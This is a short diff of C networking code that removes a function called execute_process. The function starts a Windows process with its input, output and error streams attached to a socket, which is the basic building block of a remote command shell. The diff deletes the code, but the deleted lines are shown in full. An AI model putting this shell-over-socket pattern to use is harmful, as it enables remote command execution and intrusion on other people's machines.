@@ -42,22 +42,6 @@ int recv_data(SOCKET socks_instance, char* buffer, int len)
     }
 }
 
-void execute_process(SOCKET socks_instance, char* process)
-{
-    char Process[BUFFER_SIZE_DEFAULT];
-    sprintf(Process, "%s", process);
-    STARTUPINFO sinfo;
-    PROCESS_INFORMATION pinfo;
-    memset(&sinfo, 0, sizeof(sinfo));
-    sinfo.cb = sizeof(sinfo);
-    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)socks_instance;
-    CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
-    WaitForSingleObject(pinfo.hProcess, INFINITE);
-    CloseHandle(pinfo.hProcess);
-    CloseHandle(pinfo.hThread);
-}
-
 char* ghostbyaddr_ipv4(struct hostent* remote_host,const char* buffer_addr)
 {
     struct in_addr addr = { 0 };
